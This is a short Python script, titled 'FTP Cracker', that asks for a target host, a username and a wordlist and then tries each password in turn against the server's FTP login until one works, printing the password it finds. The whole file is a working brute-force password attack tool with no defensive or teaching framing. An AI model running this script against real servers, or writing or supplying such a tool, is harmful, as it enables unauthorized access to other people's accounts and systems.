import ftplib
from rich.console import Console
from rich.panel import Panel

console = Console()

def run():
    console.print(Panel("[bold cyan]FTP Cracker[/]", expand=False))

    host = input("Enter target host (e.g. 127.0.0.1): ")
    user = input("Enter username: ")
    wordlist = input("Enter path to wordlist: ")

    try:
        with open(wordlist, "r") as f:
            passwords = f.read().splitlines()
    except FileNotFoundError:
        console.print("[red]Wordlist file not found![/]")
        return

    for password in passwords:
        try:
            ftp = ftplib.FTP(host)
            ftp.login(user, password)
            console.print(f"[green]Success! Password found:[/] {password}")
            ftp.quit()
            return
        except ftplib.error_perm:
            console.print(f"[yellow]Failed:[/] {password}")
        except Exception as e:
            console.print(f"[red]Error:[/] {e}")
            return

    console.print("[red]No valid password found in wordlist.[/]")
